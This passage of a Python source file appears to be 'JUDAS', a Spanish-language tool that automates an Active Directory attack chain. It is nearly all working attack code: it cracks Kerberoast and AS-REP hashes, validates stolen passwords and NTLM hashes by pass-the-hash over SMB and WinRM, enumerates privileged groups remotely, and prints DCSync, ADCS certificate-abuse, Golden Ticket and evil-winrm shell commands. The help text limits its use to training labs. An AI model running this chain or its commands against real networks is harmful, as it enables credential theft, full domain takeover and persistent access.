                out2, _, _ = self.r.run(f"john {shlex.quote(hfile)} --show --format=krb5asrep")
                ctx.cracked.update(parse_john_cracked(out2))

        if ctx.hashes_kerb:
            hfile = f"{ctx.output_dir}/kerb_hashes.txt"
            pot   = f"{ctx.output_dir}/kerb.pot"
            log_step(f"Crackeando {len(ctx.hashes_kerb)} Kerberoast hash(es)...")
            if cracker == "hashcat":
                self.r.run(
                    f"hashcat -m 13100 {shlex.quote(hfile)} {shlex.quote(wordlist)} "
                    f"--force -q --potfile-path {shlex.quote(pot)} 2>/dev/null",
                    timeout=600
                )
                ctx.cracked.update(parse_cracked_hashcat(pot, hfile))
            else:
                self.r.run(
                    f"john {shlex.quote(hfile)} --wordlist={shlex.quote(wordlist)} --format=krb5tgs",
                    timeout=600
                )
                out2, _, _ = self.r.run(f"john {shlex.quote(hfile)} --show --format=krb5tgs")
                ctx.cracked.update(parse_john_cracked(out2))

        if ctx.cracked:
            log_ok(f"¡Crackeadas! {ctx.cracked}")
        else:
            log_warn("Ningún hash crackeado con la wordlist actual")

        ctx.phase_done.append("crack")
        ctx.save()

    # ── FASE 6: VALIDACIÓN DE CREDENCIALES ────────────────────────────────
    def phase_validate(self) -> None:
        ctx = self.ctx
        if not ctx.cracked and not ctx.hashes_ntlm:
            log_warn("Sin credenciales ni hashes para validar")
            return

        log_phase("FASE 6 — VALIDACIÓN DE CREDENCIALES")

        for user, password in ctx.cracked.items():
            log_step(f"Validando {user}:{password}")
            qu = shlex.quote(user)
            qp = shlex.quote(password)
            qd = shlex.quote(ctx.domain)

            out, _, _ = self.r.run(
                f"netexec smb {ctx.target_ip} -u {qu} -p {qp} -d {qd} 2>/dev/null"
            )
            if "[+]" in out:
                ctx.valid_smb.append((user, password))
                log_ok(f"SMB ✓  {user}:{password}")
                if "Pwn3d!" in out:
                    ctx.admin_smb.append((user, password))
                    log_ok(f"  → ADMIN SMB (Pwn3d!)")

            if 5985 in ctx.open_ports or 5986 in ctx.open_ports:
                out2, _, _ = self.r.run(
                    f"netexec winrm {ctx.target_ip} -u {qu} -p {qp} -d {qd} 2>/dev/null"
                )
                if "[+]" in out2:
                    ctx.valid_winrm.append((user, password))
                    log_ok(f"WinRM ✓  {user}:{password}")

            time.sleep(0.5)

        if ctx.hashes_ntlm:
            log_step("Validando hashes NTLM (Pass-the-Hash)...")
            for user, nthash in ctx.hashes_ntlm.items():
                qu = shlex.quote(user)
                qh = shlex.quote(nthash)
                qd = shlex.quote(ctx.domain)

                out, _, _ = self.r.run(
                    f"netexec smb {ctx.target_ip} -u {qu} -H {qh} -d {qd} 2>/dev/null"
                )
                if "[+]" in out:
                    ctx.valid_pth.append((user, nthash))
                    log_ok(f"PTH ✓  {user}:{nthash[:8]}...")
                    if "Pwn3d!" in out:
                        ctx.admin_smb.append((user, f"HASH:{nthash}"))
                        log_ok(f"  → ADMIN PTH (Pwn3d!)")

                if 5985 in ctx.open_ports or 5986 in ctx.open_ports:
                    out2, _, _ = self.r.run(
                        f"netexec winrm {ctx.target_ip} -u {qu} -H {qh} -d {qd} 2>/dev/null"
                    )
                    if "[+]" in out2:
                        ctx.valid_winrm.append((user, f"HASH:{nthash}"))
                        log_ok(f"WinRM PTH ✓  {user}")

                time.sleep(0.5)

        if ctx.valid_winrm:
            u, p = ctx.valid_winrm[0][0], ctx.valid_winrm[0][1]
            if p.startswith("HASH:"):
                log_ok(f"\n  evil-winrm -i {ctx.target_ip} -u {u} -H {p[5:]}")
            else:
                log_ok(f"\n  evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'")

        ctx.phase_done.append("validate")
        ctx.save()

    # ── FASE 7: ENUMERACIÓN POST-ACCESO ───────────────────────────────────
    def phase_post_enum(self) -> None:
        ctx = self.ctx
        creds = ctx.best_creds()
        if not creds:
            log_warn("Sin acceso válido para enumeración post-shell")
            return

        log_phase("FASE 7 — ENUMERACIÓN POST-ACCESO")

        user = creds[0]
        nthash = creds[2] if len(creds) > 2 else None
        password = creds[1] if not nthash else None
        if password and password.startswith("HASH:"):
            nthash = password[5:]
            password = None
        log_info(f"Ejecutando como {user} {'(PTH)' if nthash else ''} vía netexec")

        def remote(cmd: str) -> str:
            return self.r.exec_remote(cmd, user, password, nthash)

        group_names = [
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Backup Operators", "Server Operators", "DnsAdmins",
            "Account Operators", "Print Operators", "Remote Management Users",
        ]
        ps_script = "; ".join(
            f'Write-Host "---{g}---"; net group "{g}" /domain' for g in group_names
        )
        ps_script += "; Write-Host '---WHOAMI---'; whoami /all"
        ps_script += f"; Write-Host '---NETUSER---'; net user {shlex.quote(user)} /domain"

        log_step("Ejecutando enumeración post-shell (1 conexión)...")
        combined = remote(f"powershell -Command \"{ps_script}\"")
        self.r.save("post_enum_combined.txt", combined)

        wa_start = combined.find("---WHOAMI---")
        nu_start = combined.find("---NETUSER---")
        wa_section = combined[wa_start:nu_start] if wa_start != -1 and nu_start != -1 else combined
        parsed = parse_whoami_all(wa_section)
        ctx.current_user   = parsed["user"]
        ctx.current_groups = parsed["groups"]
        ctx.privileges     = parsed["privileges"]

        if ctx.current_user:
            log_ok(f"Usuario: {ctx.current_user}")
        if ctx.privileges:
            log_ok(f"Privilegios ENABLED: {ctx.privileges}")
        if ctx.current_groups:
            log_info(f"Grupos ({len(ctx.current_groups)}): {ctx.current_groups[:6]}")

        for group in group_names:
            marker = f"---{group}---"
            idx = combined.find(marker)
            if idx == -1:
                continue
            next_marker = combined.find("---", idx + len(marker))
            section = combined[idx + len(marker): next_marker] if next_marker != -1 else combined[idx + len(marker):]
            members = parse_net_group_members(section)
            if members:
                ctx.net_groups[group] = members
                log_ok(f"  {group}: {members}")
            self.r.save(f"group_{group.replace(' ', '_').lower()}.txt", section)

        log_step("Enumerando shares SMB...")
        qu = shlex.quote(user)
        qd = shlex.quote(ctx.domain)
        if password:
            qp = shlex.quote(password)
            sh_out, _, _ = self.r.run(
                f"netexec smb {ctx.target_ip} -u {qu} -p {qp} -d {qd} --shares 2>/dev/null"
            )
        else:
            qh = shlex.quote(nthash)
            sh_out, _, _ = self.r.run(
                f"netexec smb {ctx.target_ip} -u {qu} -H {qh} -d {qd} --shares 2>/dev/null"
            )
        self.r.save("smb_shares.txt", sh_out)
        for line in sh_out.splitlines():
            if "READ" in line or "WRITE" in line:
                log_info(f"  Share: {line.strip()}")

        ctx.phase_done.append("post_enum")
        ctx.save()

    # ── FASE 8: ANÁLISIS Y RUTAS DE ESCALADA ──────────────────────────────
    def phase_analyze(self) -> None:
        ctx = self.ctx
        log_phase("FASE 8 — ANÁLISIS Y RUTAS DE ESCALADA")

        attack_paths: list[tuple] = []

        if "Domain Admins" in ctx.net_groups:
            members = [m.lower() for m in ctx.net_groups["Domain Admins"]]
            short_user = ctx.current_user.split("\\")[-1].lower() if ctx.current_user else ""
            if short_user and short_user in members:
                attack_paths.append(("CRÍTICO", "¡YA ERES DOMAIN ADMIN!", ""))

        if ctx.admin_smb:
            u, p = ctx.admin_smb[0]
            if p.startswith("HASH:"):
                cmd = f"impacket-secretsdump {ctx.domain}/{u}@{ctx.target_ip} -hashes :{p[5:]} -just-dc-ntlm"
            else:
                cmd = f"impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.target_ip} -just-dc-ntlm"
            attack_paths.append(("CRÍTICO", "Admin SMB (Pwn3d!) → DCSync", cmd))

        for priv in ctx.privileges:
            if priv in PRIV_ATTACKS:
                for atk_name, atk_cmd in PRIV_ATTACKS[priv]:
                    attack_paths.append(("ALTO", f"{priv} → {atk_name}", atk_cmd))

        for group in ctx.current_groups:
            g_lower = group.lower()
            for key, (sev, label, cmd) in GROUP_ATTACKS.items():
                if key in g_lower:
                    attack_paths.append((sev, f"Grupo: {group} → {label}", cmd))

        creds = ctx.best_creds()
        if creds and not attack_paths:
            u = creds[0]
            p = creds[1] if creds[1] else ""
            log_warn("Sin rutas inmediatas. Recomendando BloodHound + enumeración ADCS...")
            attack_paths.append((
                "MEDIO", "Enumeración BloodHound (ruta completa al DA)",
                f"bloodhound-python -u {u} -p '{p}' -d {ctx.domain} -dc {ctx.dc_ip} -c All --zip"
            ))
            attack_paths.append((
                "MEDIO", "Enumeración ADCS (ESC1-8)",
                f"certipy find -u {u}@{ctx.domain} -p '{p}' -dc-ip {ctx.dc_ip} -vulnerable -stdout"
            ))
            attack_paths.append((
                "MEDIO", "Revisión LAPS",
                f"netexec ldap {ctx.dc_ip} -u '{u}' -p '{p}' -d {ctx.domain} -M laps"
            ))

        severity_order = {"CRÍTICO": 0, "ALTO": 1, "MEDIO": 2}
        attack_paths.sort(key=lambda x: severity_order.get(x[0], 3))

        for sev, vector, cmd in attack_paths:
            color = RED if sev == "CRÍTICO" else (YELLOW if sev == "ALTO" else CYAN)
            print(f"\n  {BOLD}{color}[{sev}]{R} {vector}")
            if cmd:
                print(f"  {GREEN}  → {cmd}{R}")

        self._print_final_summary(attack_paths)
        ctx.phase_done.append("analyze")
        ctx.save()

    def _print_final_summary(self, paths: list) -> None:
        ctx = self.ctx
        print(f"\n{BOLD}{RED}{'═'*62}{R}")
        print(f"{BOLD}  RESUMEN JUDAS{R}")
        print(f"{BOLD}{RED}{'═'*62}{R}\n")
        print(f"  {BOLD}Objetivo:{R}      {ctx.target_ip}  |  {ctx.domain}  |  DC: {ctx.dc_ip}")
        print(f"  {BOLD}Puertos:{R}       {ctx.open_ports}")
        print(f"  {BOLD}SMB Signing:{R}   {'Habilitado' if ctx.smb_signing else YELLOW + 'DESHABILITADO' + R}")
        print(f"  {BOLD}Usuarios:{R}      {len(ctx.users)}")
        print(f"  {BOLD}Hashes ASREP:{R}  {len(ctx.hashes_asrep)}  |  Kerb: {len(ctx.hashes_kerb)}")
        print(f"  {BOLD}Crackeados:{R}    {ctx.cracked}")
        print(f"  {BOLD}PTH válidos:{R}   {[(u, h[:8]+'...') for u, h in ctx.valid_pth]}")
        print(f"  {BOLD}WinRM válidos:{R} {ctx.valid_winrm}")
        print(f"  {BOLD}Admin SMB:{R}     {ctx.admin_smb}")
        print(f"  {BOLD}Privilegios:{R}   {ctx.privileges}")
        print(f"  {BOLD}Grupos clave:{R}  {list(ctx.net_groups.keys())}")
        print(f"\n  {BOLD}Output:{R} {ctx.output_dir}/")
        print(f"  {BOLD}Estado:{R} {ctx.output_dir}/judas_state.json")

        for u, p in ctx.valid_winrm:
            if p.startswith("HASH:"):
                print(f"\n{BOLD}{GREEN}  Shell interactiva (PTH):{R}")
                print(f"  {GREEN}evil-winrm -i {ctx.target_ip} -u {u} -H {p[5:]}{R}")
            else:
                print(f"\n{BOLD}{GREEN}  Shell interactiva:{R}")
                print(f"  {GREEN}evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'{R}")
            break

        if ctx.admin_smb:
            u, p = ctx.admin_smb[0]
            print(f"\n{BOLD}{RED}  DCSync (admin confirmado):{R}")
            if p.startswith("HASH:"):
                print(f"  {RED}impacket-secretsdump {ctx.domain}/{u}@{ctx.target_ip} -hashes :{p[5:]} -just-dc-ntlm{R}")
            else:
                print(f"  {RED}impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.target_ip} -just-dc-ntlm{R}")

    # ── CADENA COMPLETA ────────────────────────────────────────────────────
    def run_full_chain(self) -> None:
        steps = [
            ("recon",       self.phase_recon),
            ("enum_users",  self.phase_enum_users),
            ("asrep",       self.phase_asrep),
            ("kerberoast",  self.phase_kerberoast),
            ("crack",       self.phase_crack),
            ("validate",    self.phase_validate),
            ("post_enum",   self.phase_post_enum),
        ]
        for name, fn in steps:
            if name not in self.ctx.phase_done:
                fn()
            else:
                log_info(f"Saltando '{name}' (ya completado)")

        if "analyze" not in self.ctx.phase_done:
            self.phase_analyze()
        else:
            log_info("Saltando 'analyze' (ya completado) — usa --reanalyze para forzar")


# ─── MODO PLAN (OCD Mindmap sin ejecución) ──────────────────────────────────
class Phase(Enum):
    RECONOCIMIENTO = 1
    ENUMERACION    = 2
    EXPLOTACION    = 3
    ESCALADA       = 4
    PERSISTENCIA   = 5

PHASE_COLORS = {
    Phase.RECONOCIMIENTO: BLUE, Phase.ENUMERACION: CYAN, Phase.EXPLOTACION: YELLOW,
    Phase.ESCALADA: RED, Phase.PERSISTENCIA: MAGENTA,
}

def run_plan_mode(ctx: JudasContext) -> None:
    log_phase("MODO PLAN — OCD Mindmap 2025")
    creds = ctx.best_creds()
    u = creds[0] if creds else "<user>"
    p = creds[1] if creds and creds[1] else "<pass>"

    plan = []
    plan.append((Phase.RECONOCIMIENTO, "LOW", "Reconocimiento SMB/LDAP", [
        f"nmap -p 445,389,5985,88,3389 --open -T3 {ctx.target_ip}",
        f"netexec smb {ctx.target_ip}/24 --gen-relay-list relay.txt",
        f"netexec smb {ctx.dc_ip} -u '' -p '' --rid-brute",
    ]))
    plan.append((Phase.ENUMERACION, "LOW", "AS-REP Roasting", [
        f"impacket-GetNPUsers {ctx.domain}/ -dc-ip {ctx.dc_ip} -no-pass -usersfile users.txt -format hashcat",
        f"hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force",
    ]))
    if creds:
        plan.append((Phase.ENUMERACION, "MEDIUM", "BloodHound + enumeración LDAP", [
            f"bloodhound-python -u {u} -p '{p}' -d {ctx.domain} -dc {ctx.dc_ip} -c All --zip",
            f"netexec smb {ctx.target_ip} -u '{u}' -p '{p}' --shares --users",
        ]))
        plan.append((Phase.EXPLOTACION, "LOW", "Kerberoasting", [
            f"impacket-GetUserSPNs {ctx.domain}/{u}:'{p}' -dc-ip {ctx.dc_ip} -request",
            f"hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force",
        ]))
        plan.append((Phase.EXPLOTACION, "MEDIUM", "Shell vía WinRM", [
            f"evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'",
        ]))
        plan.append((Phase.ESCALADA, "LOW", "ADCS (ESC1-8)", [
            f"certipy find -u {u}@{ctx.domain} -p '{p}' -dc-ip {ctx.dc_ip} -vulnerable -stdout",
            f"certipy req -u {u}@{ctx.domain} -p '{p}' -ca '<CA>' -template '<TPL>' -upn administrator@{ctx.domain}",
        ]))
        plan.append((Phase.ESCALADA, "MEDIUM", "LAPS / abuso de ACL", [
            f"netexec ldap {ctx.dc_ip} -u '{u}' -p '{p}' -M laps",
            f"bloodhound → buscar GenericAll / WriteDACL / ForceChangePassword",
        ]))
    if ctx.admin_smb:
        plan.append((Phase.ESCALADA, "HIGH", "DCSync", [
            f"impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.dc_ip} -just-dc-ntlm",
        ]))
    plan.append((Phase.PERSISTENCIA, "HIGH", "Golden Ticket", [
        f"impacket-lookupsid {ctx.domain}/{u}:'{p}'@{ctx.dc_ip} | grep 'Domain SID'",
        f"impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain {ctx.domain} Administrator",
    ]))

    oc = {"LOW": GREEN, "MEDIUM": YELLOW, "HIGH": RED}
    oc_label = {"LOW": "BAJO", "MEDIUM": "MEDIO", "HIGH": "ALTO"}
    cur_phase = None
    for i, (phase, risk, name, cmds) in enumerate(plan, 1):
        if phase != cur_phase:
            cur_phase = phase
            c = PHASE_COLORS[phase]
            print(f"\n{BOLD}{c}── FASE {phase.value}: {phase.name} ──{R}")
        print(f"\n{BOLD}[{i:02d}] {name}{R}  OPSEC: {oc[risk]}{oc_label[risk]}{R}")
        for cmd in cmds:
            if cmd.startswith("#") or "→" in cmd:
                print(f"  {GRAY}  {cmd}{R}")
            else:
                print(f"  {GREEN}  $ {cmd}{R}")


# ─── MAIN ────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(
        description="JUDAS — AD Attack Chain | Solo entornos controlados: HTB · THM · VulnHub",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modo automático (ejecuta toda la cadena):
  python3 judas.py -t 10.10.10.175 -d egotistical-bank.local --auto

Con lista de usuarios conocida:
  python3 judas.py -t 10.10.10.175 -d corp.local --users users.txt --auto

Con credenciales conocidas (salta al post-enum):
  python3 judas.py -t 10.10.10.175 -d corp.local --creds 'john:Password123' --auto

Con hash NTLM (Pass-the-Hash):
  python3 judas.py -t 10.10.10.175 -d corp.local --hash 'john:aad3b435...' --auto

Reanudar sesión anterior (continúa fases pendientes):
  python3 judas.py --resume judas_output/judas_state.json

Solo sugerencias (sin ejecutar nada):
  python3 judas.py -t 10.10.10.175 -d corp.local --plan
        """
    )
    parser.add_argument("-t", "--target",     help="IP del objetivo / DC")
    parser.add_argument("-d", "--domain",     help="Dominio AD (ej: corp.local)")
    parser.add_argument(      "--dc",         help="IP del DC si difiere del target")
    parser.add_argument("-u", "--users",      help="Archivo con usuarios (uno por línea)")
    parser.add_argument("-o", "--output",     default="judas_output", help="Directorio de salida")
    parser.add_argument(      "--auto",       action="store_true", help="Ejecutar cadena completa")
    parser.add_argument(      "--plan",       action="store_true", help="Solo mostrar ruta (sin ejecutar)")
    parser.add_argument(      "--resume",     help="Reanudar fases pendientes desde judas_state.json")
    parser.add_argument(      "--reanalyze",  action="store_true", help="Forzar re-análisis de rutas aunque ya esté completado")
    parser.add_argument(      "--creds",      help="Credenciales conocidas: user:pass")
    parser.add_argument(      "--hash",       help="Hash NTLM conocido: user:NThash (Pass-the-Hash)")
    args = parser.parse_args()

    print(render_image_banner())
    print(BANNER)

    if args.resume:
        ctx = JudasContext.load(args.resume)
        log_ok(f"Estado cargado: {args.resume}")
        pending = [s for s in ["recon","enum_users","asrep","kerberoast","crack",
                                "validate","post_enum","analyze"]
                   if s not in ctx.phase_done]
        log_info(f"Fases completadas: {ctx.phase_done}")
        log_info(f"Fases pendientes:  {pending}")
    else:
        if not args.target or not args.domain:
            parser.print_help()
            sys.exit(1)
        ctx = JudasContext(
            target_ip  = args.target,
            domain     = args.domain.upper(),
            dc_ip      = args.dc or args.target,
            output_dir = args.output,
        )

    if args.users and Path(args.users).exists():
        raw = Path(args.users).read_text().splitlines()
        ctx.users = [u.strip() for u in raw if u.strip()]
        log_ok(f"{len(ctx.users)} usuarios cargados desde {args.users}")

    if args.creds and ":" in args.creds:
        u, p = args.creds.split(":", 1)
        ctx.cracked[u] = p
        log_ok(f"Credenciales: {u}:{p}")

    if args.hash and ":" in args.hash:
        u, h = args.hash.split(":", 1)
        ctx.hashes_ntlm[u] = h
        log_ok(f"Hash NTLM cargado: {u}:{h[:8]}... (se validará vía PTH)")

    if args.reanalyze and "analyze" in ctx.phase_done:
        ctx.phase_done.remove("analyze")

    runner = Runner(ctx)
    chain  = JudasChain(ctx, runner)

    if args.plan:
        run_plan_mode(ctx)
    elif args.auto:
        chain.run_full_chain()
    elif args.resume:
        chain.run_full_chain()
    else:
        print(f"{YELLOW}Elige un modo:{R}")
        print(f"  --auto     Ejecutar cadena completa")
        print(f"  --plan     Ver ruta sugerida sin ejecutar")
        print(f"  --resume   Reanudar fases pendientes")


if __name__ == "__main__":
    main()
